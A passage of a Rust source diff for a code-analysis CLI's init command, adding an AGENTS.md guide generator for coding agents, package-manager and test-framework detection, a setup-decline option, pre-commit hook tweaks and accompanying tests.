@@ -1,12 +1,66 @@
 use std::path::Path;
 use std::process::ExitCode;
 
-use plow_config::{ExternalPluginDef, PlowConfig, PackageJson};
+use plow_config::{ExternalPluginDef, PackageJson, PlowConfig};
 use plow_core::git_env::clear_ambient_git_env;
 
 use crate::validate;
 
-// ── Project detection ──────────────────────────────────────────────
+const AGENTS_GUIDE_FILENAME: &str = "AGENTS.md";
+/// Static template used as the ground truth for the empty-project case and
+/// regression tests. Production code uses `build_agents_guide` instead.
+#[cfg(test)]
+const AGENTS_GUIDE_TEMPLATE: &str = r#"# AGENTS.md
+
+This file gives coding agents project-specific context. Keep it short and update it when workflows change.
+
+## Project Overview
+
+- Primary app or package:
+- Main entry points:
+- Important directories:
+
+## Architecture Notes
+
+- Module boundaries:
+- Generated or vendored code:
+- Sensitive areas:
+
+## Commands
+
+- Install:
+- Build:
+- Test:
+- Typecheck or lint:
+
+## Plow
+
+- Use `plow audit --format json --quiet` before committing AI-generated changes.
+- Use `plow dead-code --format json --quiet`, `plow dupes --format json --quiet`, and `plow health --format json --quiet` for targeted checks.
+- Use `plow list --entry-points --format json --quiet` and `plow list --boundaries --format json --quiet` to inspect project shape.
+
+<!-- generated:task-matrix:start -->
+| When the agent is about to... | Run |
+|---|---|
+| delete an "unused" export or file | `plow dead-code --trace <file>:<export>` |
+| delete an "unused" dependency | `plow dead-code --trace-dependency <name>` |
+| commit or open a PR | `plow audit --base <ref>` |
+| prioritize refactoring | `plow health --hotspots --targets` |
+| ask who owns code | `plow health --ownership` |
+| check untested-but-reachable code | `plow health --coverage-gaps` |
+| consolidate duplication | `plow dupes --trace dup:<fingerprint>` |
+| find feature flags | `plow flags` |
+| surface security candidates | `plow security` |
+| understand a finding | `plow explain <issue-type>` |
+| scope a monorepo | `--workspace <glob> / --changed-workspaces <ref>` (global flags, prefix any command) |
+<!-- generated:task-matrix:end -->
+
+## Agent Rules
+
+- Do not edit:
+- Always ask before:
+- Preferred style:
+"#;
 
 /// Detected project characteristics used to tailor config scaffolding.
 pub struct ProjectInfo {
@@ -17,6 +71,14 @@ pub struct ProjectInfo {
     pub test_framework: Option<String>,
     pub ui_framework: Option<String>,
     pub has_storybook: bool,
+    /// Canonical package manager parsed from the `packageManager` field in
+    /// `package.json` (the part before `@`, e.g. `"pnpm@9.1.0"` gives `pnpm`).
+    pub package_manager: Option<String>,
+    /// True when more than one of vitest / jest / @playwright/test is present
+    /// in the dependency name set. When true, `test_framework` holds the
+    /// first-match value but the AGENTS.md scaffold leaves `- Test:` blank
+    /// to avoid a confident mislabel.
+    pub test_framework_ambiguous: bool,
 }
 
 /// Inspect the project root and detect frameworks, workspace setup, etc.
@@ -27,7 +89,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
 
     let pkg = PackageJson::load(&root.join("package.json")).ok();
 
-    // Workspace detection
     let pkg_workspace_patterns = pkg
         .as_ref()
         .map(|p| p.workspace_patterns())
@@ -36,8 +97,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
 
     let is_monorepo = is_pnpm || has_npm_workspaces;
     let workspace_patterns = if is_pnpm && pkg_workspace_patterns.is_empty() {
-        // pnpm-workspace.yaml exists but no patterns in package.json;
-        // read pnpm-workspace.yaml directly for patterns.
         read_pnpm_workspace_patterns(root)
     } else {
         pkg_workspace_patterns
@@ -46,7 +105,6 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
     let workspace_tool = if is_pnpm {
         Some("pnpm".to_string())
     } else if has_npm_workspaces {
-        // Distinguish yarn vs npm by lockfile presence
         if root.join("yarn.lock").exists() {
             Some("yarn".to_string())
         } else {
@@ -56,17 +114,22 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
         None
     };
 
-    // Dependency scanning
     let all_deps = pkg
         .as_ref()
         .map(PackageJson::all_dependency_names)
         .unwrap_or_default();
 
-    let test_framework = if all_deps.iter().any(|d| d == "vitest") {
+    let has_vitest = all_deps.iter().any(|d| d == "vitest");
+    let has_jest = all_deps.iter().any(|d| d == "jest");
+    let has_playwright = all_deps.iter().any(|d| d == "@playwright/test");
+    let test_framework_count = u8::from(has_vitest) + u8::from(has_jest) + u8::from(has_playwright);
+    let test_framework_ambiguous = test_framework_count > 1;
+
+    let test_framework = if has_vitest {
         Some("Vitest".to_string())
-    } else if all_deps.iter().any(|d| d == "jest") {
+    } else if has_jest {
         Some("Jest".to_string())
-    } else if all_deps.iter().any(|d| d == "@playwright/test") {
+    } else if has_playwright {
         Some("Playwright".to_string())
     } else {
         None
@@ -84,6 +147,14 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
         None
     };
 
+    // Extract just the manager name from `packageManager` (e.g. "pnpm@9.1.0" -> "pnpm").
+    let package_manager = pkg
+        .as_ref()
+        .and_then(|p| p.package_manager.as_deref())
+        .and_then(|pm| pm.split('@').next())
+        .filter(|s| !s.is_empty())
+        .map(str::to_owned);
+
     ProjectInfo {
         is_monorepo,
         workspace_patterns,
@@ -92,6 +163,8 @@ pub fn detect_project(root: &Path) -> ProjectInfo {
         test_framework,
         ui_framework,
         has_storybook,
+        package_manager,
+        test_framework_ambiguous,
     }
 }
 
@@ -101,7 +174,6 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
     let Ok(content) = std::fs::read_to_string(&path) else {
         return Vec::new();
     };
-    // Simple YAML parsing: extract lines under `packages:` that start with `- `
     let mut patterns = Vec::new();
     let mut in_packages = false;
     for line in content.lines() {
@@ -117,7 +189,6 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
                     patterns.push(value.to_string());
                 }
             } else if !trimmed.is_empty() && !trimmed.starts_with('#') {
-                // No longer under `packages:` key
                 break;
             }
         }
@@ -131,9 +202,13 @@ fn read_pnpm_workspace_patterns(root: &Path) -> Vec<String> {
 /// `plow fix`'s missing-config fallback (so the seed file produced when
 /// auto-applying duplicate-export config rules matches what `plow init`
 /// would have written, framework detection and all).
+#[expect(
+    clippy::expect_used,
+    reason = "init config is built from json literals and serializes infallibly"
+)]
 pub fn build_json_config(info: &ProjectInfo) -> String {
     let mut config = serde_json::json!({
-        "$schema": "https://raw.githubusercontent.com/plow-rs/plow/main/schema.json",
+        "$schema": "https://raw.githubusercontent.com/fglogan/genesis-plow/main/schema.json",
     });
 
     add_json_entry_config(&mut config, info);
@@ -191,14 +266,170 @@ fn add_json_rules_config(config: &mut serde_json::Value, info: &ProjectInfo) {
 }
 
 fn insert_json_duplicates_template(output: &mut String) {
-    // `minOccurrences` has no trailing comma so the file remains valid JSON
-    // even after the JSONC comment lines are stripped (only one non-commented
-    // field exists today, so a trailing comma would dangle before `}`).
     *output = output.replacen(
         "  \"rules\":",
         "  \"duplicates\": {\n    // Hide pair-only clones; focus on widespread copy-paste\n    // worth refactoring. Lower to 2 to report every duplicate pair.\n    \"minOccurrences\": 3\n    // Common additions (uncomment to enable):\n    // \"ignore\": [\n    //   \"**/lib/**\",          // for repos that publish transpiled output to lib/\n    //   \"**/legacy/**\",       // for repos with legacy-build artifacts\n    //   \"**/__generated__/**\", // Relay, GraphQL Code Generator\n    //   \"**/generated/**\"     // OpenAPI, Protobuf codegen\n    // ]\n  },\n  \"rules\":",
         1,
     );
+}
+
+/// Build an AGENTS.md guide string tailored to the detected project.
+///
+/// Prefill rules:
+/// - `Primary app or package:` is always blank (human-judgment field).
+/// - `Module boundaries:` is filled for monorepos only; the tool label uses
+///   the same trust ladder as `Install:` (a lockfile-default-sniffed
+///   yarn/npm `workspace_tool` stays unlabeled, e.g. a Bun workspace must
+///   not read "npm workspaces").
+/// - No UI-framework or Storybook lines (presence-based, misfire on peer deps).
+/// - A provenance HTML comment is emitted under `## Commands` only when at
+///   least one Commands line is prefilled.
+/// - `Install:` from `package_manager` when Some; else from `workspace_tool`
+///   when it is `pnpm` (driven by pnpm-workspace.yaml, reliable); else blank.
+/// - `Test:` only when `test_framework` is Some AND not ambiguous; capitalized.
+/// - `Typecheck or lint:` filled with `tsc --noEmit` only when `has_typescript`.
+pub fn build_agents_guide(info: &ProjectInfo) -> String {
+    // Determine prefilled Commands lines.
+    let install_line = agents_install_line(info);
+    let test_line = agents_test_line(info);
+    let typecheck_line = if info.has_typescript {
+        "tsc --noEmit".to_string()
+    } else {
+        String::new()
+    };
+
+    let any_commands_prefilled =
+        !install_line.is_empty() || !test_line.is_empty() || !typecheck_line.is_empty();
+
+    let provenance_comment = if any_commands_prefilled {
+        "<!-- plow init prefilled these from package.json; confirm before relying on them -->\n"
+    } else {
+        ""
+    };
+
+    let module_boundaries = agents_module_boundaries_line(info);
+
+    // The task-to-command matrix is static (not project-derived), rendered
+    // from the single `crate::task_matrix::TASK_MATRIX` slice so it stays in
+    // sync with the agent-hook managed block, the schema manifest, and the
+    // generated SKILL.md section. Wrapped in the same `generated:task-matrix`
+    // markers so `scripts/generate-agent-docs.mjs` can regenerate it in place.
+    let task_matrix_block = format!(
+        "<!-- generated:task-matrix:start -->\n{}<!-- generated:task-matrix:end -->",
+        crate::task_matrix::render_task_matrix_markdown()
+    );
+
+    format!(
+        r"# AGENTS.md
+
+This file gives coding agents project-specific context. Keep it short and update it when workflows change.
+
+## Project Overview
+
+- Primary app or package:
+- Main entry points:
+- Important directories:
+
+## Architecture Notes
+
+- Module boundaries:{module_boundaries_suffix}
+- Generated or vendored code:
+- Sensitive areas:
+
+## Commands
+
+{provenance_comment}- Install:{install_suffix}
+- Build:
+- Test:{test_suffix}
+- Typecheck or lint:{typecheck_suffix}
+
+## Plow
+
+- Use `plow audit --format json --quiet` before committing AI-generated changes.
+- Use `plow dead-code --format json --quiet`, `plow dupes --format json --quiet`, and `plow health --format json --quiet` for targeted checks.
+- Use `plow list --entry-points --format json --quiet` and `plow list --boundaries --format json --quiet` to inspect project shape.
+
+{task_matrix_block}
+
+## Agent Rules
+
+- Do not edit:
+- Always ask before:
+- Preferred style:
+",
+        module_boundaries_suffix = if module_boundaries.is_empty() {
+            String::new()
+        } else {
+            format!(" {module_boundaries}")
+        },
+        provenance_comment = provenance_comment,
+        install_suffix = if install_line.is_empty() {
+            String::new()
+        } else {
+            format!(" {install_line}")
+        },
+        test_suffix = if test_line.is_empty() {
+            String::new()
+        } else {
+            format!(" {test_line}")
+        },
+        typecheck_suffix = if typecheck_line.is_empty() {
+            String::new()
+        } else {
+            format!(" {typecheck_line}")
+        },
+    )
+}
+
+/// Compute the `Install:` value for the AGENTS.md Commands section.
+///
+/// Prefers `package_manager` (canonical field in package.json), falls back to
+/// `workspace_tool == "pnpm"` (inferred from pnpm-workspace.yaml). Never
+/// emits a lockfile-sniffed `yarn install`/`npm install` to avoid false
+/// labelling.
+fn agents_install_line(info: &ProjectInfo) -> String {
+    if let Some(pm) = &info.package_manager {
+        return format!("{pm} install");
+    }
+    if info.workspace_tool.as_deref() == Some("pnpm") {
+        return "pnpm install".to_string();
+    }
+    String::new()
+}
+
+/// Compute the `Test:` value for the AGENTS.md Commands section.
+///
+/// Returns the capitalized framework name only when exactly one framework is
+/// detected. Returns an empty string when the framework is ambiguous or absent.
+fn agents_test_line(info: &ProjectInfo) -> String {
+    if info.test_framework_ambiguous {
+        return String::new();
+    }
+    info.test_framework.clone().unwrap_or_default()
+}
+
+/// Compute the `Module boundaries:` suffix for the Architecture Notes section.
+///
+/// Returns a string like `pnpm workspaces (packages/*, apps/*)` for monorepos,
+/// or an empty string for non-monorepos. The tool label follows the same trust
+/// ladder as [`agents_install_line`]: the `packageManager` field, then pnpm
+/// (driven by pnpm-workspace.yaml). The lockfile-default-sniffed yarn/npm
+/// values of `workspace_tool` are NOT used, because they confidently mislabel
+/// e.g. Bun workspaces (package.json `workspaces` + bun.lock) as
+/// "npm workspaces"; those emit the tool-neutral `workspaces (...)` form.
+fn agents_module_boundaries_line(info: &ProjectInfo) -> String {
+    if !info.is_monorepo || info.workspace_patterns.is_empty() {
+        return String::new();
+    }
+    let patterns = info.workspace_patterns.join(", ");
+    let tool = info
+        .package_manager
+        .as_deref()
+        .or_else(|| (info.workspace_tool.as_deref() == Some("pnpm")).then_some("pnpm"));
+    match tool {
+        Some(tool) => format!("{tool} workspaces ({patterns})"),
+        None => format!("workspaces ({patterns})"),
+    }
 }
 
 /// Build a TOML config string tailored to the detected project.
@@ -209,7 +440,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
         String::new(),
     ];
 
-    // Entry patterns
     let extensions = if info.has_typescript {
         "{ts,tsx,js,jsx}"
     } else {
@@ -219,14 +449,12 @@ fn build_toml_config(info: &ProjectInfo) -> String {
         "entry = [\"src/index.{extensions}\", \"src/main.{extensions}\"]"
     ));
 
-    // Ignore patterns
     if info.has_storybook {
         lines.push("ignorePatterns = [\".storybook/**\"]".to_string());
     }
 
     lines.push(String::new());
 
-    // Workspace patterns
     if info.is_monorepo && !info.workspace_patterns.is_empty() {
         lines.push("[workspaces]".to_string());
         let patterns_str: Vec<String> = info
@@ -238,7 +466,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
         lines.push(String::new());
     }
 
-    // Duplicates
     lines.push("[duplicates]".to_string());
     lines.push(
         "# Hide pair-only clones; focus on widespread copy-paste worth refactoring.".to_string(),
@@ -257,7 +484,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
     lines.push("# ]".to_string());
     lines.push(String::new());
 
-    // Rules
     lines.push(
         "# Per-issue-type severity: \"error\" (fail CI), \"warn\" (report only), \"off\" (ignore)"
             .to_string(),
@@ -275,7 +501,6 @@ fn build_toml_config(info: &ProjectInfo) -> String {
 fn print_detection_summary(info: &ProjectInfo) {
     let mut detections = Vec::new();
 
-    // Project type line
     let type_label = if info.has_typescript {
         "TypeScript"
     } else {
@@ -288,7 +513,6 @@ fn print_detection_summary(info: &ProjectInfo) {
         detections.push(type_label.to_string());
     }
 
-    // Frameworks line
     let mut frameworks = Vec::new();
     if let Some(test) = &info.test_framework {
         frameworks.push(test.as_str());
@@ -307,7 +531,6 @@ fn print_detection_summary(info: &ProjectInfo) {
         eprintln!("  Detected: {detection}");
     }
 
-    // Summary of config customizations
     let mut customizations = Vec::new();
     if info.is_monorepo && !info.workspace_patterns.is_empty() {
         customizations.push("workspace patterns");
@@ -327,8 +550,11 @@ fn print_detection_summary(info: &ProjectInfo) {
 pub struct InitOptions<'a> {
     pub root: &'a Path,
     pub use_toml: bool,
+    pub agents: bool,
     pub hooks: bool,
     pub branch: Option<&'a str>,
+    pub decline: bool,
+    pub quiet: bool,
 }
 
 /// Options for installing a managed Git pre-commit hook.
@@ -347,6 +573,12 @@ pub struct GitHooksUninstallOptions<'a> {
 }
 
 pub fn run_init(opts: &InitOptions<'_>) -> ExitCode {
+    if opts.decline {
+        return run_init_decline(opts.root, opts.quiet);
+    }
+    if opts.agents {
+        return run_init_agents(opts.root);
+    }
     if opts.hooks {
         return run_git_hooks_install(&GitHooksInstallOptions {
             root: opts.root,
@@ -358,14 +590,28 @@ pub fn run_init(opts: &InitOptions<'_>) -> ExitCode {
     run_init_config(opts.root, opts.use_toml)
 }
 
+/// `init --decline`: persist a deliberate "stay unconfigured" decision so the
+/// first-contact setup hint and the `setup` next-step stop appearing for this
+/// project. Storage is a field in the existing Impact store under `.plow/`
+/// (no new state file); this neither enables Impact tracking nor writes a
+/// config file.
+fn run_init_decline(root: &Path, quiet: bool) -> ExitCode {
+    let newly = crate::impact::decline_onboarding(root);
+    if !quiet {
+        println!(
+            "{}",
+            if newly {
+                "Plow setup hints disabled for this project."
+            } else {
+                "Plow setup hints were already disabled for this project."
+            }
+        );
+    }
+    ExitCode::SUCCESS
+}
+
 fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
-    // Check if any config file already exists
-    let existing_names = [
-        ".plowrc.json",
-        ".plowrc.jsonc",
-        "plow.toml",
-        ".plow.toml",
-    ];
+    let existing_names = [".plowrc.json", ".plowrc.jsonc", "plow.toml", ".plow.toml"];
     for name in &existing_names {
         let path = root.join(name);
         if path.exists() {
@@ -400,6 +646,24 @@ fn run_init_config(root: &Path, use_toml: bool) -> ExitCode {
     ExitCode::SUCCESS
 }
 
+fn run_init_agents(root: &Path) -> ExitCode {
+    let agents_path = root.join(AGENTS_GUIDE_FILENAME);
+    if agents_path.exists() {
+        eprintln!("{AGENTS_GUIDE_FILENAME} already exists");
+        return ExitCode::from(2);
+    }
+
+    let info = detect_project(root);
+    let guide = build_agents_guide(&info);
+    if let Err(e) = std::fs::write(&agents_path, guide) {
+        eprintln!("Error: Failed to write {AGENTS_GUIDE_FILENAME}: {e}");
+        return ExitCode::from(2);
+    }
+
+    eprintln!("Created {AGENTS_GUIDE_FILENAME}");
+    ExitCode::SUCCESS
+}
+
 /// Ensure `.plow/` is listed in the project's `.gitignore`.
 ///
 /// If `.gitignore` exists and already contains `.plow` (with or without
@@ -409,7 +673,6 @@ fn ensure_gitignore(root: &Path) {
     let gitignore_path = root.join(".gitignore");
     let existing = std::fs::read_to_string(&gitignore_path).unwrap_or_default();
 
-    // Check if .plow is already ignored (with or without trailing slash).
     let already_ignored = existing.lines().any(|line| {
         let trimmed = line.trim();
         trimmed == ".plow" || trimmed == ".plow/"
@@ -419,12 +682,8 @@ fn ensure_gitignore(root: &Path) {
         return;
     }
 
-    // Build the line to append.
     let is_new = existing.is_empty();
-    let entry = if is_new {
-        // New file — no leading newline needed.
-        ".plow/\n"
-    } else if existing.ends_with('\n') {
+    let entry = if is_new || existing.ends_with('\n') {
         ".plow/\n"
     } else {
         "\n.plow/\n"
@@ -447,7 +706,6 @@ fn ensure_gitignore(root: &Path) {
 
 /// Detect the default branch name by querying git.
 fn detect_default_branch(root: &Path) -> Option<String> {
-    // Try `git symbolic-ref refs/remotes/origin/HEAD` first (most reliable).
     let mut command = std::process::Command::new("git");
     command
         .args(["symbolic-ref", "refs/remotes/origin/HEAD"])
@@ -464,7 +722,7 @@ fn detect_default_branch(root: &Path) -> Option<String> {
     None
 }
 
-const GIT_HOOK_MARKER: &str = "# Generated by plow hooks install --target git.";
+pub const GIT_HOOK_MARKER: &str = "# Generated by plow hooks install --target git.";
 
 /// Hint printed when an existing pre-commit hook prevents installation.
 /// Mirrors the resolution block emitted by [`run_git_hooks_install`] so the
@@ -480,7 +738,7 @@ fn existing_hook_hint(hook_path: &str, fallback_base_ref: &str) -> String {
   else
     BASE="{fallback_base_ref}"
   fi
-  plow audit --base "$BASE" --quiet"#
+  plow audit --base "$BASE" --quiet --gate-marker pre-commit"#
     )
 }
 
@@ -501,11 +759,10 @@ fn lefthook_hint(fallback_base_ref: &str) -> String {
           else
             BASE="{fallback_base_ref}"
           fi
-          plow audit --base "$BASE" --quiet"#
+          plow audit --base "$BASE" --quiet --gate-marker pre-commit"#
     )
 }
 
-// Detect hook target: husky > lefthook > simple-git-hooks > bare .git/hooks
 enum HookTarget {
     Husky(std::path::PathBuf),
     Lefthook,
@@ -535,7 +792,6 @@ pub fn run_git_hooks_install(opts: &GitHooksInstallOptions<'_>) -> ExitCode {
     let root = opts.root;
     let branch = opts.branch;
 
-    // Validate --branch to prevent shell injection in the generated hook script.
     if let Some(b) = branch
         && let Err(e) = validate::validate_git_ref(b)
     {
@@ -543,8 +799,6 @@ pub fn run_git_hooks_install(opts: &GitHooksInstallOptions<'_>) -> ExitCode {
         return ExitCode::from(2);
     }
 
-    // Determine the fallback base ref: explicit --branch > detected default branch > "main".
-    // The generated hook still prefers the current branch's upstream at execution time.
     let fallback_base_ref = branch
         .map(String::from)
         .or_else(|| detect_default_branch(root))
@@ -570,7 +824,7 @@ if [ -n "$UPSTREAM" ]; then
 else
   BASE="{fallback_base_ref}"
 fi
-plow audit --base "$BASE" --quiet
+plow audit --base "$BASE" --quiet --gate-marker pre-commit
 "#
     );
 
@@ -750,6 +1004,20 @@ pub fn run_plugin_schema() -> ExitCode {
     }
 }
 
+pub fn run_rule_pack_schema() -> ExitCode {
+    let schema = plow_config::RulePackDef::json_schema();
+    match serde_json::to_string_pretty(&schema) {
+        Ok(json) => {
+            println!("{json}");
+            ExitCode::SUCCESS
+        }
+        Err(e) => {
+            eprintln!("Error: failed to serialize rule pack schema: {e}");
+            ExitCode::from(2)
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -758,8 +1026,23 @@ mod tests {
         InitOptions {
             root,
             use_toml,
+            agents: false,
             hooks: false,
             branch: None,
+            decline: false,
+            quiet: false,
+        }
+    }
+
+    fn agents_opts(root: &Path) -> InitOptions<'_> {
+        InitOptions {
+            root,
+            use_toml: false,
+            agents: true,
+            hooks: false,
+            branch: None,
+            decline: false,
+            quiet: false,
         }
     }
 
@@ -767,8 +1050,11 @@ mod tests {
         InitOptions {
             root,
             use_toml: false,
+            agents: false,
             hooks: true,
             branch,
+            decline: false,
+            quiet: false,
         }
     }
 
@@ -890,13 +1176,286 @@ mod tests {
     fn init_existing_config_blocks_both_formats() {
         let dir = tempfile::tempdir().unwrap();
         let root = dir.path();
-        // Existing .plowrc.json should block both JSON and TOML creation
         std::fs::write(root.join(".plowrc.json"), "{}").unwrap();
         assert_eq!(run_init(&config_opts(root, false)), ExitCode::from(2));
         assert_eq!(run_init(&config_opts(root, true)), ExitCode::from(2));
     }
 
-    // ── Hook tests ─────────────────────────────────────────────────
+    #[test]
+    fn init_agents_creates_agents_guide() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let path = root.join("AGENTS.md");
+        assert!(path.exists());
+        let content = std::fs::read_to_string(&path).unwrap();
+        assert!(content.contains("# AGENTS.md"));
+        assert!(content.contains("Project Overview"));
+        assert!(content.contains("plow audit --format json --quiet"));
+        // The task-to-command matrix renders into the scaffolded guide.
+        assert!(content.contains("When the agent is about to"));
+        assert!(content.contains("plow dead-code --trace <file>:<export>"));
+        assert!(content.contains("<!-- generated:task-matrix:start -->"));
+        assert!(!root.join(".plowrc.json").exists());
+        assert!(!root.join("plow.toml").exists());
+    }
+
+    #[test]
+    fn init_agents_refuses_to_overwrite_existing_guide() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(root.join("AGENTS.md"), "# Existing guide\n").unwrap();
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::from(2));
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert_eq!(content, "# Existing guide\n");
+    }
+
+    #[test]
+    fn init_agents_template_is_not_a_readiness_score() {
+        // Static template baseline.
+        let template = AGENTS_GUIDE_TEMPLATE.to_lowercase();
+        assert!(!template.contains("readiness"));
+        assert!(!template.contains("score"));
+        assert!(!template.contains("grade"));
+
+        // Fully-prefilled output (fixture 1 equivalent).
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("pnpm-workspace.yaml"),
+            "packages:\n  - 'packages/*'\n",
+        )
+        .unwrap();
+        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1"}}"#,
+        )
+        .unwrap();
+        let info = detect_project(root);
+        let generated = build_agents_guide(&info).to_lowercase();
+        assert!(!generated.contains("readiness"));
+        assert!(!generated.contains("score"));
+        assert!(!generated.contains("grade"));
+
+        // Empty-project output (fixture 4 equivalent).
+        let empty_info = ProjectInfo {
+            is_monorepo: false,
+            workspace_patterns: Vec::new(),
+            workspace_tool: None,
+            has_typescript: false,
+            test_framework: None,
+            ui_framework: None,
+            has_storybook: false,
+            package_manager: None,
+            test_framework_ambiguous: false,
+        };
+        let empty_generated = build_agents_guide(&empty_info).to_lowercase();
+        assert!(!empty_generated.contains("readiness"));
+        assert!(!empty_generated.contains("score"));
+        assert!(!empty_generated.contains("grade"));
+    }
+
+    #[test]
+    fn agents_guide_prefills_monorepo_pnpm_vitest() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("pnpm-workspace.yaml"),
+            "packages:\n  - 'packages/*'\n",
+        )
+        .unwrap();
+        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1"}}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+
+        assert!(content.contains("- Install: pnpm install"), "Install line");
+        assert!(content.contains("- Test: Vitest"), "Test line");
+        assert!(
+            content.contains("- Typecheck or lint: tsc --noEmit"),
+            "Typecheck line"
+        );
+        assert!(
+            content.contains("- Module boundaries: pnpm workspaces (packages/*)"),
+            "Module boundaries line"
+        );
+        assert!(
+            content.contains(
+                "<!-- plow init prefilled these from package.json; confirm before relying on them -->"
+            ),
+            "Provenance comment"
+        );
+        // Primary app stays blank.
+        assert!(
+            content.contains("- Primary app or package:"),
+            "Primary app blank"
+        );
+        let primary_line = content
+            .lines()
+            .find(|l| l.contains("Primary app or package:"))
+            .unwrap();
+        assert_eq!(
+            primary_line.trim(),
+            "- Primary app or package:",
+            "Primary app line must have nothing after the colon"
+        );
+        // No UI framework or Storybook lines.
+        assert!(!content.contains("UI framework"), "No UI framework line");
+        assert!(!content.contains("Storybook"), "No Storybook line");
+    }
+
+    #[test]
+    fn agents_guide_respects_package_manager_field() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"packageManager": "yarn@4.1.0"}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert!(
+            content.contains("- Install: yarn install"),
+            "yarn from packageManager field"
+        );
+    }
+
+    #[test]
+    fn agents_guide_ambiguous_test_framework_stays_blank() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1", "jest": "^29"}}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        // Test line must be blank (just "- Test:" with nothing after the colon).
+        let test_line = content
+            .lines()
+            .find(|l| l.trim_start().starts_with("- Test:"))
+            .expect("- Test: line should be present");
+        assert_eq!(
+            test_line.trim(),
+            "- Test:",
+            "Ambiguous test framework must leave - Test: blank"
+        );
+    }
+
+    #[test]
+    fn agents_guide_bun_workspace_stays_tool_neutral() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        // Bun-shaped workspace: package.json `workspaces` + bun.lock, no
+        // packageManager field, no pnpm-workspace.yaml. workspace_tool falls
+        // back to "npm", which must NOT leak into the scaffold.
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"workspaces": ["packages/*"]}"#,
+        )
+        .unwrap();
+        std::fs::write(root.join("bun.lock"), "{}").unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert!(
+            content.contains("- Module boundaries: workspaces (packages/*)"),
+            "tool-neutral boundaries label, got: {content}"
+        );
+        assert!(
+            !content.contains("npm workspaces"),
+            "lockfile-default npm label must not appear"
+        );
+    }
+
+    #[test]
+    fn agents_guide_package_manager_labels_boundaries() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::write(
+            root.join("package.json"),
+            r#"{"workspaces": ["packages/*"], "packageManager": "bun@1.2.0"}"#,
+        )
+        .unwrap();
+
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        assert!(
+            content.contains("- Module boundaries: bun workspaces (packages/*)"),
+            "packageManager field labels boundaries, got: {content}"
+        );
+        assert!(content.contains("- Install: bun install"), "Install line");
+    }
+
+    #[test]
+    fn agents_guide_empty_project_keeps_placeholders() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        // Empty fixture: no files at all.
+        let exit = run_init(&agents_opts(root));
+        assert_eq!(exit, ExitCode::SUCCESS);
+        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
+        // Must be byte-identical to the static template.
+        assert_eq!(
+            content, AGENTS_GUIDE_TEMPLATE,
+            "Empty-project output must be byte-identical to the static AGENTS_GUIDE_TEMPLATE"
+        );
+        // No provenance comment when nothing was prefilled.
+        assert!(
+            !content.contains("plow init prefilled"),
+            "No provenance comment for empty project"
+        );
+    }
+
+    #[test]
+    fn detect_test_framework_ambiguous_vitest_and_jest() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"devDependencies": {"vitest": "^1", "jest": "^29"}}"#,
+        )
+        .unwrap();
+        let info = detect_project(dir.path());
+        assert!(
+            info.test_framework_ambiguous,
+            "both vitest and jest present => ambiguous"
+        );
+        // test_framework still holds the first-match value.
+        assert_eq!(info.test_framework.as_deref(), Some("Vitest"));
+    }
+
+    #[test]
+    fn detect_package_manager_field() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"packageManager": "pnpm@9.0.0"}"#,
+        )
+        .unwrap();
+        let info = detect_project(dir.path());
+        assert_eq!(
+            info.package_manager.as_deref(),
+            Some("pnpm"),
+            "packageManager parsed to just the manager name"
+        );
+    }
 
     #[test]
     fn hooks_fails_without_git_dir() {
@@ -924,7 +1483,6 @@ mod tests {
         assert!(content.contains("BASE=\"main\""));
